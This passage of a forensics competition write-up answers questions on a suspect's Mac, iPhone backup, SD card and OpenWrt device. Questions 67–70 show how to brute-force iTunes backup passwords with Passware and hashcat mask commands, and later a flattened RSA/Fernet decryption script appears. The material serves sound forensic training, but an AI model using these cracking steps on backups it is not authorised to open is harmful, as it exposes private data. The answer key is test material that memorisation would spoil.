(Spotlight Search) ? (以阿拉伯数字回答) (1分)</code></pre><pre><code>9</code></pre><p>直接搜</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920828.png" alt="image-20231030163013764"></p><h3 id="62"><a href="#62" class="headerlink" title="62"></a>62</h3><pre><code>[单选题] 当用户设置了自动登录 (Auto Login) 后，王景浩计算机的操作系统会产生哪个档案? (2分)A. manifest.plistB. info.plistC. PasswordPanel.stringsD. kcpassword</code></pre><pre><code>D</code></pre><p>chatgpt做题法</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920505.png" alt="image-20231030163845596"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920413.png" alt="image-20231030163901984"></p><h3 id="63"><a href="#63" class="headerlink" title="63"></a>63</h3><pre><code>[单选题] 王景浩计算机的登录密码 (Login Password) 是什么? (2分)A. 1qa@WS3edB. 3ed$RF5tgC. 5tg^YH7ujD. 2ws$RF6yh</code></pre><p>按上题 直接去找<code>kcpassword</code>文件 全局搜索</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921935.png" alt="image-20231030213948968"></p><p>但是这里打开是乱码  我们使用x-ways打开</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921347.png" alt="image-20231102210546170"></p><h3 id="64"><a href="#64" class="headerlink" title="64"></a>64</h3><pre><code>[单选题] 在王景浩的计算机里，他最后使用哪个电邮地址登录 &#39;iCloud&#39; 账号? (2分)A. kinghoo0w0@gmail.comB. wonghoo588@yahoo.comC. kingho726@aol.comD. kinghoo0w0@yahoo.com</code></pre><pre><code>D</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921496.png" alt="image-20231030183637429"></p><h3 id="65"><a href="#65" class="headerlink" title="65"></a>65</h3><pre><code>[多选题] 王景浩计算机里的手机备份 (iTunes Backup) 包含哪些iOS版本? (2分)A. 12.5.6B. 15.4C. 15.5D. 16.0.3</code></pre><pre><code>AC</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921973.png" alt="image-20231029215559511"></p><h3 id="66"><a href="#66" class="headerlink" title="66"></a>66</h3><pre><code> [填空题] 王景浩曾经将一台 iPhone 6 连接他的计算机，请问它最后的连接时间是什么? (以时区UTC+8回答) (如答案为 2022-12-29 16:01:59，需回答 20221229160159) (2分)</code></pre><pre><code>20220819152402</code></pre><p>在火眼中找蓝牙连接信息 在已配对中找到一个 但是是王景浩ios备份中的iPhone XR</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311010831399.png" alt="image-20231101083110279"></p><p>又在未配对中找到一个iPhone 对应的应该是iPhone 6的手机系统</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311010832949.png" alt="image-20231101083253910"></p><h3 id="67"><a href="#67" class="headerlink" title="67"></a>67</h3><pre><code> [单选题] 苹果手机备份的密码 (iTunes Backup Encryption Password) 会记录在什么档案? (2分)A. Info.plistB. privacy.jsonC. Manifest.plistD. PasswordPanel.strings</code></pre><pre><code>C</code></pre><p>算是一个积累吧 对四个文件都进行了全局搜索 B是找不到的 找C的时候 看了一眼路径 里面提到Backup备份文件夹 感觉就八九不离十了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311010846063.png" alt="image-20231101084635973"></p><p> 一共有两个这样的<code>Manifest.plist</code>文件 都是在Backup文件夹下的备份 将其提取出来 放在passwarekit中 竟然还能爆破密码 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311010848182.png" alt="image-20231101084840949"></p><h3 id="68"><a href="#68" class="headerlink" title="68"></a>68</h3><pre><code>[多选题] 以下哪种工具可以用作破解密码? (1分)A. PasswareB. John The RipperC. HashCatD. Password Recovery Toolkit</code></pre><pre><code>ABCD</code></pre><p>都是老熟人 都可以爆破密码</p><h3 id="69"><a href="#69" class="headerlink" title="69"></a>69</h3><pre><code>[多选题] 通过 &#39;hashcat&#39; 破解 &#39;iTunes Backup&#39; 密码需要制订一个 &#39;txt&#39; 档案，若该备份的手机iOS版本是10以上，需要按照下列哪个提示字符 (String) 的数据去制订这个 &#39;txt&#39; 档案? (3分)A. WPKYB. ITERC. SALTD. DPICE. DPSL</code></pre><pre><code>ABCDE</code></pre><p>找到一篇文章<a href="https://blog.changyy.org/2021/08/iphone-ios-itunes-backup-password-recovery-via-cracked.html">使用hashcat恢复IOS&#x2F;iPad备份密码</a>  里面有描述使用哪些字符去制定<code>txt</code>档案</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311010910389.png" alt="image-20231101091004341"></p><p>在这篇文章中也提到了在macos中ios备份的路径是<code>~/Library/Application Support/MobileSync/Backup/</code></p><p>同时 还提供了使用hashcat恢复备份文件密码的具体办法 下个脚本提取出密码的hash值 <a href="https://github.com/philsmd/itunes_backup2hashcat">恢复ios备份文件密码脚本</a> 在使用hashcat进行爆破 </p><pre><code>这里假设密码已知是四位数字 进行掩码爆破hashcat -d 1 -m 14800 hash.txt -a 3 &#39;?d?d?d?d&#39; # ios10以上的版本 使用14800参数hashcat -d 1 -m 14700 hash.txt -a 3 &#39;?d?d?d?d&#39; # ios9以前的版本 使用14700参数</code></pre><h3 id="70"><a href="#70" class="headerlink" title="70"></a>70</h3><pre><code>[填空题] 王景浩采用了4位数字加密了他的iPhone XR的备份，分析它的密码是什么? (以阿拉伯数字回答) (3分)</code></pre><pre><code>2022</code></pre><p>接上题 我们在这里使用passwarekit进行爆破密码即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311010950210.png" alt="image-20231101095020098"></p><h3 id="71"><a href="#71" class="headerlink" title="71"></a>71</h3><pre><code>[填空题] 最后一次连上王景浩计算机的3D打印机的IP 地址是什么? (不要输入答案中的 &#39;.&#39;，以阿拉伯数字回答) (2分)</code></pre><pre><code>1014140</code></pre><p>在无线网络信息中找到3D打印机的记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011005304.png" alt="image-20231101100520253"></p><p>再在浏览器历史记录中找<code>2022-10-20 16:28:06</code> 时间左右的访问记录 第一条网页没打开 那就是第二个出现的url</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011048149.png" alt="image-20231101104822096"></p><h3 id="72"><a href="#72" class="headerlink" title="72"></a>72</h3><pre><code>[填空题] 3D打印机最后一次在王景浩的计算机尝试打印的时间? (以时区UTC+8回答) (2分)</code></pre><pre><code>20221020162806</code></pre><p>接上题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011050308.png" alt="image-20231101105034260"></p><h3 id="73"><a href="#73" class="headerlink" title="73"></a>73</h3><pre><code>[单选题] 最后一次经由王景浩计算机打印的3D图档案名字是什么? (2分)A. CE3_balljoint_extender.gcodeB. um3-penguin-real-mini-keychain-merged-tpu.gcodeC. CE3_Prancer.gcodeD. CE3_2020-psu-atx-mount.gcode</code></pre><pre><code>D</code></pre><p>直接全局搜索了 找最后访问的时间最晚的 就是<code>CE3_2020-psu-atx-mount.gcode</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011056018.png" alt="image-20231101105624963"></p><h3 id="74"><a href="#74" class="headerlink" title="74"></a>74</h3><pre><code>[单选题] 王景浩计算机的Safari浏览器的默认搜索引擎 (Default Search Engine) 是什么? (2分)A. 百度B. 谷歌C. 360D. Safari</code></pre><pre><code>B</code></pre><p>大部分搜索记录都是谷歌</p><h3 id="75"><a href="#75" class="headerlink" title="75"></a>75</h3><pre><code>[单选题] 分析王景浩计算机的数据，王景浩的比特币钱包 (Bitcoin Wallet) 地址是什么? (2分)A. bc1quw… ...zpzjztB. bc1qm… ...5f7n9gC. bc1q79… ...h4sq52D. bc1qsl… ...je7hkk</code></pre><pre><code>A</code></pre><p>在MacMail的附件中 找到一张收款码 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011110321.png" alt="image-20231101111000265"></p><h3 id="76"><a href="#76" class="headerlink" title="76"></a>76</h3><pre><code>[单选题] AGC公司员工 &#39;Carson&#39; 有一个由公司发给他的电邮账户，分析王景浩的计算机数据并找出 &#39;Carson&#39; 的电邮账户密码。 (2分)A. AGC2020@pwB. AGC2012@PWC. AGC2020@hkgD. AGC2021@PW</code></pre><pre><code>A</code></pre><p> 其实在AGC的计算机中已经可以分析出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011125114.png" alt="image-20231101112522061"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011125145.png" alt="image-20231101112532099"></p><h3 id="77"><a href="#77" class="headerlink" title="77"></a>77</h3><pre><code>[填空题] 王景浩曾经冒充AGC公司员工 &#39;Carson&#39; 发送电邮给AGC 客户，这封电邮的 &#39;Message-ID&#39; 是什么? 回答它的首８位数值。(以大写英文和阿拉伯数字回答，如 4GEF90GD) (2分)</code></pre><pre><code>004001D8</code></pre><p>在邮箱中其实能找到两封符合要求的邮件 但是查看十六进制 发现两封的message-id其实是一样的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011132104.png" alt="image-20231101113203050"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011132694.png" alt="image-20231101113217642"></p><h3 id="78"><a href="#78" class="headerlink" title="78"></a>78</h3><pre><code>[多选题] 王景浩采用计算机里的哪种工具进入和盗取AGC公司的数据? (2分)A. TeamviewerB. OpenVPNC. Remote Desktop ManagerD. Tor Browser</code></pre><pre><code>ABC</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011230232.png" alt="image-20231101123042186"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011230424.png" alt="image-20231101123051372"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011231174.png" alt="image-20231101123109123"></p><p>ABC三种软件计算机中都有 都是用来远程连接的 而王景浩是通过远程连接来入侵AGC公司的计算机的 所以三个都是  D洋葱浏览器是暗网浏览器 但是不会设计入侵外部计算机</p><h3 id="79"><a href="#79" class="headerlink" title="79"></a>79</h3><pre><code>[多选题] 王景浩在AGC公司盗取了下列什么类型的档案? (2分)A. ostB. xlsxC. jpgD. docx</code></pre><pre><code>AB</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011237876.png" alt="image-20231101123706821"></p><h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><pre><code>[填空题] 王景浩的计算机于2022年9月29日曾经接上一个虚拟专用网络 (Virtual Private Network - VPN)，这个VPN的IP地址是什么? (不要输入答案中的 &#39;.&#39;，以阿拉伯数字回答) (2分)</code></pre><pre><code>61238217108</code></pre><p>接78题 王景浩是使用Openvpn伪造ip来进行入侵AGC计算机 那么AGC计算机上显示的远程桌面的客户端地址就是王景浩计算机连上的vpn的ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311011237876.png"></p><h3 id="81"><a href="#81" class="headerlink" title="81"></a>81</h3><pre><code>[填空题] 装置 &#39;「KingHoo」的iPhone&#39; 的蓝牙媒体访问控制地址 (MAC Address) 是什么? (不要输入答案中的 &#39;：&#39; 或 &#39;-&#39; ，以大写英文及阿拉伯数字回答) (1分)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311012133804.png" alt="image-20231101213323717"></p><h3 id="82"><a href="#82" class="headerlink" title="82"></a>82</h3><pre><code>[单选题] 王景浩何时将 &#39;小宝&#39; 加为iPhone XR的手机联络人 (Contact) ? (以时区UTC +8回答) (1分)A. 2022年07月14日B. 2022年07月15日C. 2022年07月16日D. 2022年07月17日E. 2022年07月18日</code></pre><pre><code>A</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311012134847.png" alt="image-20231101213424803"></p><h3 id="83"><a href="#83" class="headerlink" title="83"></a>83</h3><pre><code>[单选题] 王景浩的iPhone XR显示他的汇丰银行户口于2022年9月19日收到多少存款? (1分)A. HKD298.8B. HKD344.7C. HKD396D. HKD543E. HKD465.1</code></pre><pre><code>B</code></pre><p> <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311012134717.png" alt="image-20231101213457664"></p><h3 id="84"><a href="#84" class="headerlink" title="84"></a>84</h3><pre><code>[单选题] 王景浩的iPhone XR没有收藏 (Bookmark) 哪家音响品牌的网页? (1分)A. KEFB. EDIFIERC. BOSED. YAMAHAE. Bowers &amp; Wilkins</code></pre><pre><code>D</code></pre><p> <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311012135756.png" alt="image-20231101213530700"></p><h3 id="85"><a href="#85" class="headerlink" title="85"></a>85</h3><pre><code>[单选题] 王景浩的iPhone XR手机记录了他曾于2022年8月26日试飞无人机， 当天试飞的地点在哪里? (2分)A. 大埔海滨B. 启德C. 数码港D. 西环E. 将军澳</code></pre><pre><code>D</code></pre><p>学到一点 无人机的文件夹在<code>AppDomain-com.dji.golite</code>中 将这个文件夹提取出来 放到物联取证大师中分析一下 找到2022年8月26日的飞行记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921582.png" alt="image-20231102170934427"></p><p>可以看到这天飞行的大致经纬度 是<code>114.119986E 22.281744N</code> 直接在地图上进行搜索  发现靠近西环</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311021713245.png" alt="image-20231102171356197"></p><h3 id="86"><a href="#86" class="headerlink" title="86"></a>86</h3><pre><code>[单选题] 王景浩于2022年8月26日试飞无人机的总飞行时间 (Total Flight Time) 多久? (2分)A. 6分58秒B. 8分10秒C. 9分6秒D. 11分1秒E. 15分33秒</code></pre><p> 在物联取证大师处找到时间线 框选出8月26日主要的飞行时间段 在查看图表 从图表中看到8月26日总飞行时间差不多在9分钟左右(注意这个飞行时间是飞起来的时间 没飞起来不算 所以要看横轴以上的时间)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311021828002.png" alt="image-20231102182816940"></p><h3 id="87"><a href="#87" class="headerlink" title="87"></a>87</h3><pre><code>[多选题] 王景浩用 iPhone XR 拍了一张照片&#39;IMG_0012.HEIC&#39;，那照片什么地方曾被修改? (3分)A. 拍摄时间B. 经纬度C. 时区D. 档案名称E. 拍摄装备</code></pre><pre><code>AB</code></pre><p>首先在火眼中找到目标照片 查看照片属性 发现其和在火眼中看到的日期不一样</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921097.png" alt="image-20231102195620780"></p><h3 id="88"><a href="#88" class="headerlink" title="88"></a>88</h3><pre><code>[填空题] 承上题，那张照片修改后的经纬度是什么? (不要输入答案中的 &#39;.&#39;，将经纬度合并回答。 如 22.2846135 114.1739116，需回答 2228461351141739116) (3分)</code></pre><h2 id="王景浩SD卡"><a href="#王景浩SD卡" class="headerlink" title="王景浩SD卡"></a>王景浩SD卡</h2><h3 id="96"><a href="#96" class="headerlink" title="96"></a>96</h3><pre><code>[填空题] 王景浩 SD 记忆卡 (SD Memory Card) 的储存容量有多少个字节 (Byte) ? (以阿拉伯数字回答) (1分)</code></pre><pre><code>8004304896</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921610.png" alt="image-20231102210928935"></p><h3 id="97"><a href="#97" class="headerlink" title="97"></a>97</h3><pre><code>[单选题] 检视记忆卡上硬盘分区表 (Partition Table) 资讯，记忆卡共有多少个分区 (Partition) ? (1分)A. 1B. 2C. 3D. 4E. 0</code></pre><pre><code>B</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921462.png" alt="image-20231102202327557"></p><h3 id="98"><a href="#98" class="headerlink" title="98"></a>98</h3><pre><code>[单选题] 检视记忆卡上硬盘分区表资讯，第二个分区的分区代码 (Partition Code) 是什么? (1分)A. 07B. AFC. 0CD. 2BE. 01</code></pre><pre><code>A</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921354.png" alt="image-20231103160858363"></p><h3 id="99"><a href="#99" class="headerlink" title="99"></a>99</h3><pre><code>[多选题] 记忆卡的档案不能被读取，记忆卡受损的原因包括? (2分)A. 目录项结构 (Directory Entry) 受损B. 启动扇区表 (Master Boot Record) 受损C. 文件分配表 (File Allocation Table - FAT) 受损D. 引导扇区 (Boot Sector) 受损E. 以上各项皆是</code></pre><pre><code>AB</code></pre><p>还是使用x-ways挂载磁盘进行分析打开分区1进行查看  发现很多文件都产生了USBc坏道</p><pre><code>USBC坏道是指USB存储设备中出现的坏道，这些坏道可能会导致数据无法读取或写入。USBC坏道的原因可能包括设备老化、频繁插拔、电压不稳定等。解决USBC坏道的方法包括使用磁盘检测工具扫描和修复坏道、更换USB存储设备等。</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921127.png" alt="image-20231103161851518"></p><p>但是引导扇区和FAT是没有损坏的 所以选择AB</p><h3 id="100"><a href="#100" class="headerlink" title="100"></a>100</h3><pre><code>[填空题] 承上题，通过分析及手动恢复还原，记忆卡里有多少个出錯的情况出现? (以阿拉伯数字回答) (3分)</code></pre><pre><code>8</code></pre><p>查看出现USBc坏道的部分即可</p><h3 id="101"><a href="#101" class="headerlink" title="101"></a>101</h3><pre><code>[多选题] 记忆卡第一个文件系统 (File System) 中有一个图片档案，它的SHA-256哈希值是 ‘F7E003781456D2E01CFE0EB46988D5BB433ADF9841164BBB90BAC67C0C9B21AF’。该档案显示了哪些影像? (2分)A. 人B. 山C. 汽车D. 交通灯E. 天空</code></pre><pre><code>BE</code></pre><p>计算全部图片的哈希在找到目标哈希值对应的图片即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921818.png" alt="image-20231103184143849"></p><h3 id="102"><a href="#102" class="headerlink" title="102"></a>102</h3><pre><code>[单选题] 检视记忆卡的数据，在2022年10月9日约中午12时5分至12时15分之间的录像 (Video) 中，曾经出现哪一个IP地址? (2分)A. 61.238.217.108B. 155.137.190.123C. 192.168.1.66D. 185.200.100.242E. 213.104.156.111</code></pre><pre><code>D</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170921902.png" alt="image-20231103184348582"></p><h3 id="103"><a href="#103" class="headerlink" title="103"></a>103</h3><pre><code>[填空题] 恢复还原后的记忆卡中，第二个文件系统显示有多少个空闲簇 (Free Cluster)? (以阿拉伯数字回答) (2分)</code></pre><h3 id="104"><a href="#104" class="headerlink" title="104"></a>104</h3><pre><code>[填空题] 记忆卡第一个文件系统中有一个视频档，它的SHA-256哈希值是 ‘847E1E5FEF64B49C8D689DC3537D619B87666619A7C1EF0CC821153641847C19’，这个视频的档数据存在文件系统 (File System) 的最后的簇号 (Last Cluster Number) 是什么? (以阿拉伯数字回答) (2分)</code></pre><h3 id="105"><a href="#105" class="headerlink" title="105"></a>105</h3><pre><code>[单选题] 尝试分析记忆卡数据結構受损的原因，通过合适的方法把数据恢复到原本没有出错的状况，记忆卡的SHA-256哈希值是什么？ (3分)A. E63DF0… …8627D3B. 3FD99E… …17B6DEC. 3BADAA… …666A8FD. BBB211… …E00710E. AA9E81… …2C04FE</code></pre><h2 id="王景浩记忆棒"><a href="#王景浩记忆棒" class="headerlink" title="王景浩记忆棒"></a>王景浩记忆棒</h2><h3 id="17"><a href="#17" class="headerlink" title="17"></a>17</h3><pre><code>[单选题] 王景浩的USB记忆棒里有一个 ‘Data’ 文件夹 (Folder)，它存有哪一种类型的密钥文件? (1分)A. pemB. cerC. crtD. keyE. 以上皆非</code></pre><pre><code>A</code></pre><p>是rsa的 所以是pem类型的密钥文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922565.png" alt="image-20231108094608718"></p><h3 id="18"><a href="#18" class="headerlink" title="18"></a>18</h3><pre><code>[多选题] 承上题，‘Data’ 文件夹里有一个被加密了的档案，它是被哪一种加密方法加密? (2分)A. SymmetricB. PGPC. TwofishD. RSAE. Triple DES</code></pre><pre><code>AD</code></pre><p>在<code>King_Ho_USB.E01/KingH00/Data/Notes</code>有有关加密解密算法和密钥的文件 使用了rsa和Fernet(就是对称加密算法，即<code>Symmetric</code>)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922767.png" alt="image-20231108094934408"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922429.png" alt="image-20231108094948839"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922117.png" alt="image-20231108095006568"></p><h3 id="19"><a href="#19" class="headerlink" title="19"></a>19</h3><pre><code>[单选题] 尝试将档案解密，该档案属于哪一个类型 (File type)? (2分)A. exeB. odsC. rtfD. sqlE. 以上皆非</code></pre><pre><code>D</code></pre><p>参考上面的Decryption写一个解密脚本 </p><p>是仿照这个师傅写的 <a href="https://blog.csdn.net/WXjzcccc/article/details/128175094?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169940809816800185819605%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169940809816800185819605&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-128175094-null-null.142%5Ev96%5Epc_search_result_base9&utm_term=2022%E5%B9%B4%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E4%BD%93%E8%B5%9B&spm=1018.2226.3001.4187">22美亚杯团体赛</a></p><pre><code>import rsafrom cryptography import Fernetwith open(&#39;P1&#39;,&#39;rb&#39;) as f1:    a = f1.read()    k = rsa.PrivateKey.load_pkcs1(a)with open(&quot;minecraft.exe&quot;,&quot;rb&quot;) as ef:    V2 = ef.read(128)    V3 = ef.read()decrypted_key = rsa.decrypt(V2,K)cipher = Fernet(decrypted_key)decrypted_file=cipher.decrypt(V3)with open(&quot;decrypted_file.txt&quot;,&quot;wb&quot;) as fw:    fw.write(decrypted_file)</code></pre><p>运行解密  打开是一个sql备份文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922150.png" alt="image-20231108100958476"></p><h3 id="20"><a href="#20" class="headerlink" title="20"></a>20</h3><pre><code>[多选题] 承上题，找出以下哪一个名字出现在该档案里? (3分)A. Armand ToB. Adam SmasherC. Beverly KotD. Huma ChanE. 以上皆非</code></pre><pre><code>AC</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922409.png" alt="image-20231108101015809"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927542.png" alt="image-20231108101031803"></p><h2 id="朗尼草莓计算机"><a href="#朗尼草莓计算机" class="headerlink" title="朗尼草莓计算机"></a>朗尼草莓计算机</h2><p>草莓计算机只有一个bin  只能手搓</p><h3 id="89"><a href="#89" class="headerlink" title="89"></a>89</h3><pre><code>[单选题] 朗尼草莓 (Raspberry) 计算机操作系统的主机名称 (hostname) 是什么? (1分)A. OpenWrtB. adminC. rootD. AsusRtE. DDwrt</code></pre><pre><code>A</code></pre><p>在upper\etc\config中 找到system文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922661.png" alt="image-20231103190543616"></p><h3 id="90"><a href="#90" class="headerlink" title="90"></a>90</h3><pre><code>[多选题] 以下哪项对于朗尼草莓计算机操作系统的描述是正确的? (2分)A. LAN地址是 192.168.1.24B. 提供点对点隧道协议 (Point-to-Point Tunneling Protocol - PPTP) VPN服务C. WIFI登录密码为’OpenWrt’D. 提供网络时间协议 (NTP) 服务E. 时区设置相等于UTC+8</code></pre><pre><code>AE</code></pre><p>C选项 在\upper\etc\config\wireless 密码是59814785</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922066.png" alt="image-20231103191712494"></p><p>A选项 在\upper\etc\config\network ip地址是192.168.1.24</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922776.png" alt="image-20231103191938929"></p><p>B选项 不是用的p2p服务  是ssl服务</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922923.png" alt="image-20231103192010345"></p><p>E和B选项也在\upper\etc\config\system HKT-8就是UTC+8 有ntp服务 但是没开启</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922554.png" alt="image-20231103192244599"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170927370.png" alt="image-20231103192404097"></p><h3 id="91"><a href="#91" class="headerlink" title="91"></a>91</h3><pre><code>[多选题] 承上题，‘VPN’ 服务器的IP地址及端口 (Port) 是什么? (2分)A. IP地址 61.238.217.108B. IP地址 192.168.8.1C. IP地址 103.10.12.106D. 端口 33248E. 端口 1194F. 端口 1701</code></pre><pre><code>AE</code></pre><p>查看openvpn的配置 在\upper\etc\openvpn\jpVPN.auth中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922962.png" alt="image-20231103193804418"></p><h3 id="92"><a href="#92" class="headerlink" title="92"></a>92</h3><pre><code>[填空题] 朗尼草莓计算机操作系统设定了一个档案来储存系统的 ‘log_file’ ，档案名称是什么? (不要输入 ‘.’，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG) (2分)</code></pre><pre><code>SYSlog</code></pre><p>还是查看刚刚的系统配置文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922770.png" alt="image-20231103194321411"></p><h3 id="93"><a href="#93" class="headerlink" title="93"></a>93</h3><pre><code>[单选题] 承上题，检视上述的档案，当中有几个IP地址曾经成功登录这个系统的 ‘VPN’ 服务? (3分)A. 1B. 2C. 3D. 4E. 0</code></pre><pre><code>B</code></pre><p>直接导出刚刚的<code>SYSlog</code>  放到notepad++中进行分析 搜索<code>password auth succeeded</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922121.png" alt="image-20231103195136417"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922504.png" alt="image-20231103195205861"></p><h3 id="94"><a href="#94" class="headerlink" title="94"></a>94</h3><pre><code>[单选题] 承上题，检视上述的档案，当中有几个IP地址曾经尝试以 ‘root’ 登入装置但因密码错误而不成功? (2分)A. 2B. 4C. 5D. 6E. 8</code></pre><pre><code>D</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922321.png" alt="image-20231103195406410"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922182.png" alt="image-20231103195458526"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922979.png" alt="image-20231103195536511"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922971.png" alt="image-20231103195554632"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170922914.png" alt="image-20231103195608632"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923018.png" alt="image-20231103195814364"></p><h3 id="95"><a href="#95" class="headerlink" title="95"></a>95</h3><pre><code>[填空题] 根据装置的过往记录，‘log_file’ 是设在 ‘usr/rooney/’ 的哪个已被删除的子文件夹里 (Sub Directory)? (以大写英文回答) (3分)</code></pre><pre><code>RECORD</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923408.png" alt="image-20231103200047231"></p><p>这个路径在刚刚92题已经知道了</p><h2 id="朗尼计算机-手机"><a href="#朗尼计算机-手机" class="headerlink" title="朗尼计算机+手机"></a>朗尼计算机+手机</h2><h3 id="106"><a href="#106" class="headerlink" title="106"></a>106</h3><pre><code>[单选题] 朗尼的计算机有什么软件可以创建比特币钱包 (Bitcoin Wallet)? (1分)A. MetaMaskB. ElectrumC. TrezorD. 以上皆非</code></pre><pre><code>B</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923307.png" alt="image-20231103201143392"></p><h3 id="107"><a href="#107" class="headerlink" title="107"></a>107</h3><pre><code>[填空题] 朗尼通过比特币替王景浩清洗黑钱，分析朗尼的计算机及手机，朗尼收取王景浩黑钱的比特币地址 (Bitcoin Address) 是什么? (以大写英文及阿拉伯数字回答) (1分)</code></pre><pre><code>bc1q0r0l3lh63wy865cd560kn3uhjqrwggvty4zj8n</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923006.png" alt="image-20231103201334458"></p><h3 id="108"><a href="#108" class="headerlink" title="108"></a>108</h3><pre><code>[单选题] 朗尼收取王景浩多少比特币作为清洗黑钱的费用? (1分)A. 1%B. 4%C. 7%D. 10%E. 15%</code></pre><pre><code>D</code></pre><p>查看聊天记录可得</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923331.png" alt="image-20231103212048710"></p><h3 id="109"><a href="#109" class="headerlink" title="109"></a>109</h3><pre><code>[单选题] 朗尼的计算机里有一个没被加密的比特币钱包，它的回复种子 (Recovery Seed) 不包含哪一个英文字? (1分)A. opposeB. areaC. twiceD. roast</code></pre><pre><code>D</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170923518.png" alt="image-20231103202237981"></p><h3 id="110"><a href="#110" class="headerlink" title="110"></a>110</h3><pre><code>[单选题] 朗尼的计算机里有多少个加密了 (Encrypted) 的比特币钱包? (1分)A. 1B. 2C. 3D. 4E. 5</code></pre><pre><code>E</code></pre><p><img 